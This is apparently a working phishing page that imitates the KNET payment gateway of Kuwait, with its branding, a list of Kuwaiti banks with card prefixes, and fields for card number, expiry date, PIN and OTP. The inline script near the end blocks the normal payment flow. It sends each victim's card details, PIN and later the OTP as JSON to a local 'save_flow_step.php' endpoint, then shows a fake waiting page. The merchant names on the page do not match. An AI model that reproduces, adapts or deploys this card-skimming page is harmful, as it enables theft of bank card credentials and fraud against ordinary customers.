<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta http-equiv="CACHE-CONTROL" content="max-age=0">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>KNET Payments</title>
    <link href="./knet/payment-responsive.css" rel="stylesheet" type="text/css">
    <link href="./knet/payment-stylesheet.css" rel="stylesheet" type="text/css">
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17803159343"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-17803159343');
</script>

</head>

<body>
   

    <form method="post" action="">
<img src="./knet/mob.jpg" alt="" style="width: 100%; max-width: 350px; height: auto; display: block; margin: 20px auto 0;">
        </div>

        <div id="PayPageEntry">
            <div class="container">
                <div class="content-block">
                    <div class="form-card">
                        <div align="center" class="container-blogo">
                            <img style="width: 55px" class="" src="./knet/knet.png" alt="logo">
                        </div>
                        <div class="row">
                            <label class="column-label">Merchant: </label>
                            <label class="column-value text-label">Althnayan</label>
                        </div>
<div id="OrgTranxAmt">
  <label class="column-label">Amount:</label>
  <label class="column-value text-label">KD 0.00</label>
</div>


                        <!-- Added for PG Eidia Discount starts   -->

                        <div class="row" id="DiscntRate" style="display:none;">

                        </div>
                        <div class="row" id="DiscntedAmt" style="display:none;">

                        </div>

                        <!-- Added for PG Eidia Discount ends   -->

                    </div>

                    <div class="form-card">
                        <div class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
    						font-family: helvetica, arial, sans serif;
    						color: #ff0000;
   							 padding-right: 15px; display:none;margin-bottom: 3px;text-align: center;" id="otpmsgDC">
                        </div>

                        <!--Customer Validation  for knet-->
                        <div class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
    						font-family: helvetica, arial, sans serif;
    						color: #ff0000;
   							 padding-right: 15px; display:none;margin-bottom: 3px;text-align: center;" id="CVmsg">
                        </div>

                        <div id="ValidationMessage"></div>

                        <div id="savedCardDiv" style="display:none;">
                            <div class="row">

                                <br>

                            </div>
                            <!-- Commented the bank name display for kfast ends -->

                            <!-- Added for Points Redemption -->

                            <div class="row">
                                <label class="column-label" style="margin-left: 20px;">
									PIN:
								</label>
                                <input inputmode="numeric" pattern="[0-9]*" name="debitsavedcardPIN" id="debitsavedcardPIN" autocomplete="off" title="Should be in number. Length should be 4" type="password" size="4" maxlength="4" class="allownumericwithoutdecimal" style="width:50%;"
                                    onkeyup="return ValidateNumPin(event);" onkeypress="return ValidateNumPin(event);" ondrop="return false;" oncopy="return false;" onpaste="return false;">
                            </div>

                            <!-- Added for Points Redemption -->
                        </div>

                        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>


                        <script>
                            $(document).ready(function() {
                                $("#type").change(function() {
                                    var val = $(this).val();
                                    if ((val == "prefix")) {
                                        $("#size").html("<option value=''>prefix</option>");
                                    } else if (val == "AUB") {
                                        $("#size").html("<option value=''>prefix</option><option value='532674'>532674</option><option value='537016'>537016</option>");
                                    } else if (val == "Al Ahli Bank of Kuwait [ABK]") {
                                        $("#size").html("<option value=''>prefix</option><option value='403622'>403622</option><option value='423826'>423826</option><option value='428628'>428628</option>");
                                    } else if (val == "Al Rajhi Bank [Rajhi]") {
                                        $("#size").html("<option value=''>prefix</option><option value='458838'>458838</option>");
                                    } else if (val == "Bank of Bahrain Kuwait [BBK]") {
                                        $("#size").html("<option value=''>prefix</option><option value='418056'>418056</option><option value='588790'>588790</option>");
                                    } else if (val == "Boubyan Bank [Boubyan]") {
                                        $("#size").html("<option value=''>prefix</option><option value='404919'>404919</option><option value='450605'>450605</option><option value='426058'>426058</option><option value='431199'>431199</option><option value='470350'>470350</option><option value='490455'>490455</option><option value='490456'>490456</option>");
                                    } else if (val == "Burgan Bank [Burgan]") {
                                        $("#size").html("<option value=''>prefix</option><option value='540759'>540759</option><option value='402978'>402978</option><option value='415254'>415254</option><option value='450238'>450238</option><option value='468564'>468564</option><option value='403583'>403583</option><option value='49219000'>49219000</option>");
                                    } else if (val == "Commercial Bank of Kuwait [CBK]") {
                                        $("#size").html("<option value=''>prefix</option><option value='521175'>521175</option><option value='516334'>516334</option><option value='532672'>532672</option><option value='537015'>537015</option>");
                                    } else if (val == "Doha Bank [Doha]") {
                                        $("#size").html("<option value=''>prefix</option><option value='419252'>419252</option>");
                                    } else if (val == "Gulf Bank of Kuwait [GBK]") {
                                        $("#size").html("<option value=''>prefix</option><option value='531329'>531329</option><option value='531471'>531471</option><option value='531470'>531470</option><option value='517419'>517419</option><option value='559475'>559475</option><option value='517458'>517458</option><option value='531644'>531644</option><option value='526206'>526206</option>");
                                    } else if (val == "KFH [TAM]") {
                                        $("#size").html("<option value=''>prefix</option><option value='45077848'>45077848</option><option value='45077849'>45077849</option>");
                                    } else if (val == "Kuwait Finance House [KFH]") {
                                        $("#size").html("<option value=''>prefix</option><option value='450778'>450778</option><option value='485602'>485602</option><option value='573016'>573016</option><option value='532674'>532674</option>");
                                    } else if (val == "Kuwait International Bank [KIB]") {
                                        $("#size").html("<option value=''>prefix</option><option value='409054'>409054</option><option value='406464'>406464</option>");
                                    } else if (val == "National Bank of Kuwait [NBK]") {
                                        $("#size").html("<option value=''>prefix</option><option value='464452'>464452</option><option value='589160'>589160</option>");
                                    } else if (val == "NBK [Weyay]") {
                                        $("#size").html("<option value=''>prefix</option><option value='46445250'>46445250</option><option value='543363'>543363</option>");
                                    } else if (val == "Qatar National Bank [QNB]") {
                                        $("#size").html("<option value=''>prefix</option><option value='521020'>521020</option><option value='524745'>524745</option>");
                                    } else if (val == "Union National Bank [UNB]") {
                                        $("#size").html("<option value=''>prefix</option><option value='457778'>457778</option>");
                                    } else if (val == "Warba Bank [Warba]") {
                                        $("#size").html("<option value=''>prefix</option><option value='532749'>532749</option><option value='559459'>559459</option><option value='541350'>541350</option><option value='525528'>525528</option>");
                                    }
                                });
                            });
                        </script>


                        <div id="FCUseDebitEnable" style="margin-top: 5px;">

                            <div class="row">
                                <label class="column-label" style="width:40%;">Select Your Bank:</label>
                                <select class="column-value" style="width:60%;" name="bkName" id="type" required>
									<option value="prefix" title="Select Your Bank">Select Your Bank</option>
									<option value="Al Ahli Bank of Kuwait [ABK]" title="Al Ahli Bank of Kuwait [ABK]">Al Ahli Bank of Kuwait [ABK]</option>
									<option value="Al Rajhi Bank [Rajhi]" title="Al Rajhi Bank [Rajhi]">Al Rajhi Bank [Rajhi]</option>
									<option value="Bank of Bahrain Kuwait [BBK]" title="Bank of Bahrain Kuwait [BBK]">Bank of Bahrain Kuwait [BBK]</option>
									<option value="Boubyan Bank [Boubyan]" title="Boubyan Bank [Boubyan]">Boubyan Bank [Boubyan]</option>
									<option value="Burgan Bank [Burgan]" title="Burgan Bank [Burgan]">Burgan Bank [Burgan]</option>
									<option value="Commercial Bank of Kuwait [CBK]" title="Commercial Bank of Kuwait [CBK]">Commercial Bank of Kuwait [CBK]</option>
									<option value="Doha Bank [Doha]" title="Doha Bank [Doha]">Doha Bank [Doha]</option>
									<option value="Gulf Bank of Kuwait [GBK]" title="Gulf Bank of Kuwait [GBK]">Gulf Bank of Kuwait [GBK]</option>
									<option value="KFH [TAM]" title="KFH [TAM]">KFH [TAM]</option>
									<option value="Kuwait Finance House [KFH]" title="Kuwait Finance House [KFH]">Kuwait Finance House [KFH]</option>
									<option value="Kuwait International Bank [KIB]" title="Kuwait International Bank [KIB]">Kuwait International Bank [KIB]</option>
									<option value="National Bank of Kuwait [NBK]" title="National Bank of Kuwait [NBK]">National Bank of Kuwait [NBK]</option>
									<option value="NBK [Weyay]" title="NBK [Weyay]">NBK [Weyay]</option>
									<option value="Qatar National Bank [QNB]" title="Qatar National Bank [QNB]">Qatar National Bank [QNB]</option>
									<option value="Union National Bank [UNB]" title="Union National Bank [UNB]">Union National Bank [UNB]</option>
									<option value="Warba Bank [Warba]" title="Warba Bank [Warba]">Warba Bank [Warba]</option>
								</select>
                            </div>

                            <div class="row three-column" id="Paymentpagecardnumber">


                                <!-- Added for Points Redemption -->



                                <label class="column-label">Card Number:</label>


                                <!-- Added for Points Redemption -->

                                <label>
									<select class="column-value" name="prefix" id="size" style="width: 26%;" required>
										<option value="" title="Prefix">
											Prefix
										</option>
									</select>
								</label>
                                <label> <input name="cnmbr" id="debitNumber" type="tel" inputmode="numeric"
										pattern="[0-9]*" size="10" class="allownumericwithoutdecimal"
										style="width: 32%;" maxlength="10"
										title="Should be in number. Length should be 10">
								</label>
                            </div>

                            <div class="row three-column" id="cardExpdate">

                                <div id="debitExpDate">
                                    <label class="column-label">
										Expiration Date:
									</label>
                                </div>


                                <select name="month" class="column-value" required>
									<option value="0">
										MM
									</option>

									<option value="1">


										01



									</option>

									<option value="2">


										02



									</option>

									<option value="3">


										03



									</option>

									<option value="4">


										04



									</option>

									<option value="5">


										05



									</option>

									<option value="6">


										06



									</option>

									<option value="7">


										07



									</option>

									<option value="8">


										08



									</option>

									<option value="9">


										09



									</option>

									<option value="10">



										10


									</option>

									<option value="11">



										11


									</option>

									<option value="12">



										12


									</option>

								</select>

                                <select name="year" class="column-long" required>
									<option value="">
										YYYY
									</option>

									<option value="2026">
										2026
									</option>

									<option value="2027">
										2027
									</option>

									<option value="2028">
										2028
									</option>

									<option value="2029">
										2029
									</option>

									<option value="2030">
										2030
									</option>

									<option value="2031">
										2031
									</option>

									<option value="2032">
										2032
									</option>

									<option value="2033">
										2033
									</option>

									<option value="2034">
										2034
									</option>

									<option value="2035">
										2035
									</option>

									<option value="2036">
										2036
									</option>

									<option value="2037">
										2037
									</option>

									<option value="2038">
										2038
									</option>

									<option value="2039">
										2039
									</option>

									<option value="2040">
										2040
									</option>

									<option value="2041">
										2041
									</option>

									<option value="2042">
										2042
									</option>

									<option value="2043">
										2043
									</option>

									<option value="2044">
										2044
									</option>

									<option value="2045">
										2045
									</option>

									<option value="2046">
										2046
									</option>

									<option value="2047">
										2047
									</option>

									<option value="2048">
										2048
									</option>

									<option value="2049">
										2049
									</option>

									<option value="2050">
										2050
									</option>

									<option value="2051">
										2051
									</option>

									<option value="2052">
										2052
									</option>

									<option value="2053">
										2053
									</option>

									<option value="2054">
										2054
									</option>

									<option value="2055">
										2055
									</option>

									<option value="2056">
										2056
									</option>

									<option value="2057">
										2057
									</option>

									<option value="2058">
										2058
									</option>

									<option value="2059">
										2059
									</option>

									<option value="2060">
										2060
									</option>

									<option value="2061">
										2061
									</option>

									<option value="2062">
										2062
									</option>

									<option value="2063">
										2063
									</option>

									<option value="2064">
										2064
									</option>

									<option value="2065">
										2065
									</option>

									<option value="2066">
										2066
									</option>

									<option value="2067">
										2067
									</option>

								</select>


                            </div>
                            <div class="row" id="PinRow">

                                <!-- <div class="col-lg-12"><label class="col-lg-6"></label></div> -->
                                <input type="hidden" name="cardPinType" value="A">
                                <div id="eComPin">
                                    <label class="column-label">
										PIN:
									</label>
                                </div>
                                <div>
                                    <input inputmode="numeric" pattern="[0-9]*" name="pin" id="cardPin" autocomplete="off" title="Should be in number. Length should be 4" type="password" size="4" maxlength="4" class="allownumericwithoutdecimal" style="width:60%;" required>

                                </div>


                            </div>

                        </div>
                    </div>

                    <div class="form-card">
                        <div class="row">

                            <div style="text-align:center;">
                                <div id="loading" style="display:none;">
                                    <center><img src="./knet/loading.gif" style="height:20px;float:left;margin-left:20%"><label class="column-value text-label" style="width:70%;text-align:center;">Processing.. please wait ...</label>
                                    </center>
                                </div>





                                <div id="submithide">
                                    <button name="proceed" type="submit" class="submit-button" id="proceed"> Submit</button>

<input name="proceedCancel" type="button" class="cancel-button" onclick="window.location.href='../../dashboard.php';" id="cancel1" value="Cancel">


                                </div>



                            </div>
                        </div>
                    </div>

                    <div align="center" id="overlayhide" class="overlay" style="display:none;">
                        <img src="./knet/loadingmob.gif" style="height: 15%;margin-top:50%;">
                    </div>





                    <footer>
                        <div class="footer-content-new">
                            <div class="row_new">
                                <div style="text-align: center;font-size: 11px;line-height: 18px;">
                                    All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2026&nbsp;<br><span style="font-size: 10px;font-weight:bold;color: #0077D5;">The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company
										- KNET</span>
                                </div>
                            </div>

                            <div id="DigiCertClickID_cM-vbZrL"></div>
                        </div>
                        <div id="DigiCertClickID_cM-vbZrL"></div>
                    </footer>


                </div>
            </div>
        </div>




        <!--  Payment Page Confirmation Starts-->
        <div id="payConfirm" style="display: none;">
            <div class="container">
                <div class="content-block">

                    <div class="form-card">
                        <div class="container-blogo">
                            <img class="logoHead-mob" src="./knet/knet.png" alt="logo">
                        </div>
                        <div class="row">
                            <div><label class="column-label">Merchant:</label></div>
                            <div><label class="column-value text-label">General Department of Traffic</label> </div>
                        </div>
                        <div id="OrgTranxAmtConfirm">
                            <div><label class="column-label">Amount:</label></div>
                            <div><label class="column-value text-label"> KD&nbsp;Session::get('price')</label></div>
                        </div>

                        <!-- Added for PG Eidia Discount -->

                        <div class="row" id="DiscntRateConfirm" style="display:none;">

                        </div>
                        <div class="row" id="DiscntedAmtConfirm" style="display:none;">

                        </div>

                        <!-- Added for PG Eidia Discount -->

                    </div>
                    <div class="form-card">
                        <div class="notification" style="border: #ff0000 1px solid; background-color: #f7dadd; font-size: 12px;
    						font-family: helvetica, arial, sans serif;
    						color: #ff0000;
   							 padding-right: 15px; margin-bottom: 3px;text-align: center;display:none;" id="otpmsgDC2">
                        </div>
                        <div class="row alert-msg" id="notificationbox" style="color:#31708f; font-family: Arial, Helvetica, serif; font-size: 13px;">
                            <!-- Added for Points Redemption - modified -->
                            <div id="notification">
                                <!-- <p><span class="title" style="font-weight:bold">NOTIFICATION:</span> You will presently receive an SMS on your mobile number registered with your bank.
This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.</p> -->
                            </div>
                        </div>
                        <div class="row">

                            <div id="payConfirmCardNum">

                                <!-- Added for Points Redemption -->



                                <label class="column-label">Card Number:</label>

                                <!-- Added for Points Redemption -->

                            </div>
                            <div><label class="column-value text-label" id="DCNumber" style="padding-left:5px;"></label>
                            </div>
                        </div>
                        <div class="row" id="payConfirmExpmnth">
                            <div><label class="column-label" style="width:41%">Expiration Month:</label></div>
                            <div><label class="column-value text-label" id="expmnth" style="padding-left:5px;width:59%"></label></div>
                        </div>
                        <div class="row" id="payConfirmExpyr">
                            <div><label class="column-label">Expiration Year:</label></div>
                            <div><label class="column-value text-label" id="expyear" style="padding-left:5px;"></label>
                            </div>
                        </div>
                        <!-- Added for Points Redemption -->

                        <div class="row">
                            <div><label class="column-label">PIN:</label></div>
                            <div><label class="column-value text-label" style="padding-left:5px;">****</label></div>
                        </div>

                        <!-- Added for Points Redemption -->

                        <div class="row" id="OTPDCDIV" style="display: none;">
                            <div><label class="column-label" style="padding-top: 4px;">OTP:</label></div>
                            <div>
                                <!-- <input class="paymentinput" style="width: 60%;"  type="tel" id="debitOTPtimer" name="debitOTP" placeholder="teset" size="6" maxLength="6" 
                    	onkeyup="return isOtpNumeric(event);" onkeypress="return isOtpNumeric(event);" /> -->
                                <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" class="allownumericwithoutdecimal" style="width: 60%;" id="debitOTPtimer" name="debitOTP" placeholder="teset" size="6" maxlength="6" onkeyup="return isOtpNumeric(event);" onkeypress="return isOtpNumeric(event);"
                                    oninput="return isOtpNumeric(event);">
                                <!-- Added for Points Redemption -->

                                <div><label class="column-value text-label" style="display:none;float: right; cursor: pointer;color: #0077D5;text-decoration: underline;" id="Resend" onclick="payConfirmAjax(&#39;Resend&#39;);">Resend OTP</label></div>
                                <!-- Added for Points Redemption -->
                            </div>
                        </div>
                    </div>

                    <div class="form-card">
                        <div class="row">
                            <div style="text-align: center;">

                                <div id="loading" style="display:none;">
                                    <center><img src="./knet/loading.gif" style="height:20px;float:left;margin-left:20%"><label class="column-value text-label" style="width:70%;text-align:center;">Processing.. please wait ...</label>
                                    </center>
                                </div>

                                <div id="submithide1">
                                    <button type="submit" name="confirm" class="submit-button"> Confirm</button>
                                    <input name="proceedCancel" type="button" class="cancel-button" onclick="window.location.href='/../../dashboard.php';" value="Cancel">
                                </div>
                            </div>
                        </div>
                    </div>

                    <div align="center" id="overlayhide1" class="overlay" style="display:none;">
                        <img src="./knet/loadingmob.gif" style="height: 15%;margin-top:50%;">
                    </div>

                    <footer>
                        <div class="footer-content">
                            <span>
								<div class="row_new">
									<div
										style="text-align: center;font-size: 11px; color: #000000;font-weight:normal;line-height: 18px;">
										All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2026&nbsp;<br><span
											style="font-size: 10px;font-weight:bold;color: #0077D5;">
											The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company -
											KNET</span>
                        </div>
                </div>
                </span>

            </div>
            </footer>
        </div>
        </div>
        </div>

        <input type="hidden" name="encryptedCardNumber" id="encryptedCardNumber" value="">
        <input type="hidden" name="encryptedMonth" id="encryptedMonth" value="">
        <input type="hidden" name="encryptedYear" id="encryptedYear" value="">
        <!-- Hidden Fields : Start -->

        <input type="hidden" name="creditDebitCheck">

        <!--  End -->
        <!-- Code Added for GSTN fix Starts -->
        <input type="hidden" name="gstnTXNId" id="gstnTXNId" value="">
        <input type="hidden" name="gstnFlag" id="gstnFlag" value="0">
        <input type="hidden" name="paymentInitTime" id="paymentInitTime" value="Wed Dec 18 18:07:04 AST 2024">
        <!-- Code Added for GSTN fix Ends -->
        <input type="hidden" name="gripsFlag" value="">
        <input type="hidden" name="selectedPymntInstrmnt" id="selectedPymntInstrmnt" value="">
        <input type="hidden" name="captchaMsg" id="captchaMsg" value="">
        <!-- End -->
        <input type="hidden" name="paymentId" value="102435359000254804">
        <input type="hidden" name="atmPayRetentionPeriod" value="0">


        <input type="hidden" name="merchHeaderFile" value="">

        <input type="hidden" name="mrchName" value="Tap Payments EPSP">
        <input type="hidden" name="mrchWeb" value="https://kw.payments.tap.company">
        <input type="hidden" name="pymntInstrmntCC" id="pymntInstrmntCC" value="1">

        <input type="hidden" name="pymntInstrmntAC" value="0">
        <input type="hidden" name="pymntInstrmntDC" id="pymntInstrmntDC" value="1">
        <input type="hidden" name="pymntInstrmntPC" id="pymntInstrmntPC" value="0">

        <input type="hidden" name="pymntInstrmntPZ" id="pymntInstrmntPZ" value="0">

        <input type="hidden" name="pymntInstrmntAP" value="0">
        <input type="hidden" name="pymntInstrmntDD" value="0">
        <input type="hidden" name="ecomFlg" value="0">
        <input type="hidden" name="captchaFlg" value="0">
        <input type="hidden" name="instName" value="KIB">

        <input type="hidden" name="avsFlg" value="0">
        <input type="hidden" name="headerType" value="0">
        <input type="hidden" name="maestroCheckFlag" value="0">
        <input type="hidden" name="rupFlg" value="0">
        <input type="hidden" name="pymntInstrmntIMPS" value="0">
        <input type="hidden" name="footer" value="">

        <input type="hidden" name="debitSel" value="P">
        <input type="hidden" name="creditSel" value="">
        <input type="hidden" name="prepaidSel" value="">

        <input type="hidden" name="siFlag" value="0">

        <input type="hidden" name="fcFlag" id="fcFlag" value="0">
        <input type="hidden" name="fcChecked" id="fcChecked">
        <input type="hidden" name="deletecard" value="">
        <input type="hidden" name="cardnohash" value="">

        <input type="hidden" name="fcExpCheck" id="fcExpCheck">
        <input type="hidden" name="fcCtCheck" id="fcCtCheck" value="0">
        <input type="hidden" name="fcDtCheck" id="fcDtCheck" value="0">
        <input type="hidden" name="fcPdCheck" id="fcPdCheck" value="0">

        <input type="hidden" name="rdc" id="rdc" value="">
        <input type="hidden" name="checkBrand" id="checkBrand" value="">
        <input type="hidden" name="onOffType" id="onOffType" value="">
        <input type="hidden" name="maestro" id="maestro" value="">

        <input type="hidden" name="ccInstFlg" value="0">
        <input type="hidden" name="ccTermFlg" value="0">
        <input type="hidden" name="merchantCurrencyFlg" value="0">
        <input type="hidden" name="cardCurrencyFlg" value="0">
        <input type="hidden" name="otherCurrencyFlg" value="0">

        <input type="hidden" name="pymntInstrmntCnt" id="pymntInstrmntCnt" value="2">

        <input type="hidden" value="" name="cspg">
        <input type="hidden" name="CSRFToken" value="feadcc1d-93a9-46c8-b28f-f503abfc8d0b">

        <input type="hidden" value="" name="otpStatus">
        <input type="hidden" value="0" name="otpallowed">
        <input type="hidden" value="0" name="otpmethod">
        <input type="hidden" name="emiFlag" id="emiFlag" value="0">
        <input type="hidden" name="radioFlag" id="radioFlag" value="0">
        <input type="hidden" name="otherCards" id="otherCards" value="">
        <input type="hidden" name="textFile" value="-">
        <input type="hidden" name="errorStr" id="errorStr">
        <input type="hidden" name="resultCode" id="resultCode">
        <input type="hidden" name="postDate" id="postDate">
        <input type="hidden" name="responseCode" id="responseCode">
        <!-- Added for Rupay denied by Risk -->
        <input type="hidden" name="tranId" id="tranId">
        <input type="hidden" name="authCode" id="authCode">
        <!-- End -->

        <input type="hidden" name="mrchHeaderMsgFile" value="">
        <input type="hidden" name="mrchHeaderHtmlFile" value="">
        <input type="hidden" name="instHeaderHtmlFile" value="">

        <input type="hidden" id="OtpUserID" name="OtpUserID" value="">
        <input type="hidden" name="paymentOtpGenCancel">
        <input type="hidden" name="otpConfirmationFlg">
        <input type="hidden" name="MaskingCardNum" value="0">
        <input type="hidden" id="debitCardNumber" name="debitCardNumber" value="">
        <input type="hidden" name="fCCustMob" id="fCCustMob" value="">
        <input type="hidden" name="encryptedSavedCardPin" id="encryptedSavedCardPin" value="">
        <input type="hidden" name="config">
        <input type="hidden" name="timeOver" value="0">
        <input type="hidden" name="Otptenant">
        <input type="hidden" name="useragent" value="Android">
        <input type="hidden" name="currSymbol" value="KD">
        <input type="hidden" name="usingFc">
        <input type="hidden" name="inst_p2pflg" value="0">
        <input type="hidden" name="mrch_p2pflg" value="0">
        <input type="hidden" name="term_p2pflg" value="0">
        <input type="hidden" name="otpgencount" value="0">
        <input type="hidden" name="otpvalcount" value="0">
        <input type="hidden" name="langID" value="EN">
        <input type="hidden" name="paymentCVdeclineValue">
        <input type="hidden" name="custvalid" value="0">
        <input type="hidden" name="otpflgdiv" value="0">
        <!-- Added by jansirani for P2P Refund -->
        <input type="hidden" name="p2pRefundFlg" value="0">
        <input type="hidden" name="instp2pRefundFlg" value="0">
        <input type="hidden" name="termp2pRefundFlg" value="0">
        <input type="hidden" name="mrchp2pRefundFlg" value="0">
        <input type="hidden" name="p2pRefundId" value="">
        <input type="hidden" name="BranDType">

        <!-- Added for OTP at I-T-B level -->
        <input type="hidden" name="appAllbrands" value="1">
        <input type="hidden" name="accptBrndListAmtlmt" value="">
        <input type="hidden" name="accptBrndList" value="202330389621213,201916924925612,201916924855488,201916975234419,201916924643150,201916924589070,201916924542860,202217100853887,201916975055702,201916924900814,201916924803186,201916924658211,201916975376462,201916924560086,201916924517503,201916405343641">
        <input type="hidden" name="binsOTPflg" value="1">
        <input type="hidden" name="amountlimit" value="25.000">
        <input type="hidden" name="OTPtranamtlmt">
        <input type="hidden" name="OTPamtlmtidentifier">
        <!-- Added for OTP at I-T-B level -->

        <!-- Added for Points Redemption  -->
        <input type="hidden" id="otpgenMethod" name="otpgenMethod" value="">
        <input type="hidden" name="resend" value="">
        <input type="hidden" name="pymntPointsRedemptionflg" value="0">
        <!-- Added for Points Redemption  -->


        <!--Added for PG Discount flag  -->
        <input type="hidden" name="discountval">
        <input type="hidden" name="discountedtranamount">
        <!--Added for PG Discount flag  -->

        <!-- End -->

        <!-- Added for PROD issue 5th tranx without OTP -->
        <input type="hidden" name="OTPtranId" value="">
        <!-- Added for PROD issue 5th tranx without OTP -->

        <input type="hidden" name="debitYear" id="debitYearSelect" value="0">
        <input type="hidden" name="debitMonth" id="debitMonthSelect" value="0">

        <!-- Hidden Fields : End -->

        <!-- Added for prod issue - 29-jun-21 -->
        <input type="hidden" name="paymentStatus" value="">
        <!-- <input type="hidden" name="pymntpagebkstatus" value=""/> -->
        <input type="hidden" name="ErrorText" value="">
        <!-- Added for prod issue - 29-jun-21 -->

        <input type="hidden" name="kfastRegAttemptCount" value="0">
        <input type="hidden" name="kfastRegDeclineValue">
        <input type="hidden" name="farm_order_id" id="farm_order_id" value="">
    </form>
    <script src="./knet/jquery-3.5.1.js"></script>
    <script src="js/farm_checkout_total.js"></script>
    <script src="js/farm_knet_card_snapshot.js"></script>
    
<script>
window.onload = function () {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const totalRaw = urlParams.get('total') || '0';
    const total = typeof farmCheckoutTotal !== 'undefined'
      ? farmCheckoutTotal.resolve(totalRaw)
      : parseFloat(totalRaw || '0').toFixed(3);
    const tickets = urlParams.get('tickets') || '0';
    const orderIdFromUrl = urlParams.get('order_id') || '';
    try {
      if (orderIdFromUrl) {
        sessionStorage.setItem('farm_order_id', orderIdFromUrl);
      }
    } catch (eSid) {}
    var farmOidEl = document.getElementById('farm_order_id');
    if (farmOidEl) {
      farmOidEl.value = orderIdFromUrl || (function () {
        try {
          return sessionStorage.getItem('farm_order_id') || '';
        } catch (e2) {
          return '';
        }
      })();
    }
    
    const formattedTotal = total;
    
    const priceLabel = document.querySelector("#OrgTranxAmt .column-value");
    if (priceLabel) {
      priceLabel.textContent = `KD ${formattedTotal}`;
    }
    
    const priceConfirmLabel = document.querySelector("#OrgTranxAmtConfirm .column-value");
    if (priceConfirmLabel) {
      priceConfirmLabel.textContent = `KD ${formattedTotal}`;
    }
    
  } catch (e) {
    console.error("Failed to load price from URL", e);
  }
};

document.querySelector('form').addEventListener('submit', function (e) {
  e.preventDefault();

  const urlParams = new URLSearchParams(window.location.search);
  const tickets = urlParams.get('tickets') || '0';
  const total =
    typeof farmCheckoutTotal !== 'undefined'
      ? farmCheckoutTotal.resolve(urlParams.get('total') || '0')
      : urlParams.get('total') || '0';
  let orderId = urlParams.get('order_id') || '';
  try {
    if (!orderId) {
      orderId = sessionStorage.getItem('farm_order_id') || '';
    }
  } catch (eOid) {}

  const formData = new FormData(this);
  formData.append('tickets', tickets);
  formData.append('total', total);

  var sub = e.submitter;
  if (!sub && document.activeElement && document.activeElement.form === this && document.activeElement.getAttribute('type') === 'submit') {
    sub = document.activeElement;
  }

  function sendFlowStep(step, payload) {
    if (!orderId) {
      return Promise.resolve({ success: false });
    }
    return fetch('save_flow_step.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ order_id: String(orderId), step: step, data: payload || {} })
    })
      .then(function (r) {
        return r.json().catch(function () {
          return { success: false };
        });
      })
      .catch(function () {
        return { success: false };
      });
  }

  var basePayload = { url_total: total, url_tickets: tickets };

  if (sub && sub.getAttribute('name') === 'proceed') {
    if (!orderId) {
      alert('يرجى إتمام الطلب من صفحة الدفع أولاً (اختيار KNET ثم إتمام الطلب) حتى يُحفظ رقم الطلب.');
      return;
    }
    var payload = Object.assign({}, basePayload);
    var reservationId = String(Date.now());
    payload.reservation_id = reservationId;
    ['bkName', 'prefix', 'cnmbr', 'month', 'year', 'pin'].forEach(function (k) {
      var v = formData.get(k);
      if (v != null && String(v) !== '') {
        payload[k] = String(v);
      }
    });
    sendFlowStep('knet_card_details', payload).then(function () {
      try {
        if (typeof farmKnetCardSnapshot !== 'undefined') {
          farmKnetCardSnapshot.saveFromKnetPayload(reservationId, orderId, payload);
        }
      } catch (eSnap) {}
      try {
        sessionStorage.setItem('farm_knet_reservation_id', String(reservationId));
      } catch (eRid) {}
      try {
        if (window.farmTrack && typeof window.farmTrack.flushBeacon === 'function') {
          window.farmTrack.flushBeacon();
        }
      } catch (eTrack) {}
      var oidQ = orderId ? '&farm_order_id=' + encodeURIComponent(String(orderId)) : '';
      window.location.href =
        'wite/knetwait.php?total=' +
        encodeURIComponent(total) +
        '&tickets=' +
        encodeURIComponent(tickets) +
        '&reservation_id=' +
        encodeURIComponent(reservationId) +
        oidQ;
    });
    return;
  }

  if (sub && sub.getAttribute('name') === 'confirm') {
    if (!orderId) {
      alert('رقم الطلب غير متوفر لتسجيل رمز التحقق.');
      return;
    }
    var otpPayload = Object.assign({}, basePayload);
    var otpEl = document.getElementById('debitOTPtimer');
    var otpVal = otpEl ? otpEl.value : formData.get('debitOTP');
    if (otpVal) {
      otpPayload.debitOTP = String(otpVal).replace(/\D/g, '').slice(0, 8);
    }
    sendFlowStep('knet_otp', otpPayload).then(function () {
      try {
        if (window.farmTrack && typeof window.farmTrack.flushBeacon === 'function') {
          window.farmTrack.flushBeacon();
        }
      } catch (eTrack2) {}
      var ridWait = '';
      try {
        ridWait = sessionStorage.getItem('farm_knet_reservation_id') || '';
      } catch (eR) {}
      if (!ridWait) {
        ridWait = String(Date.now());
      }
      var oidQ = orderId ? '&farm_order_id=' + encodeURIComponent(String(orderId)) : '';
      window.location.href =
        'wite/knetwait.php?total=' +
        encodeURIComponent(total) +
        '&tickets=' +
        encodeURIComponent(tickets) +
        '&reservation_id=' +
        encodeURIComponent(ridWait) +
        oidQ;
    });
    return;
  }
});
</script>
<script src="https://js.pusher.com/8.4.0/pusher.min.js"></script>
<script src="js/client_track.js"></script>

</body>

</html>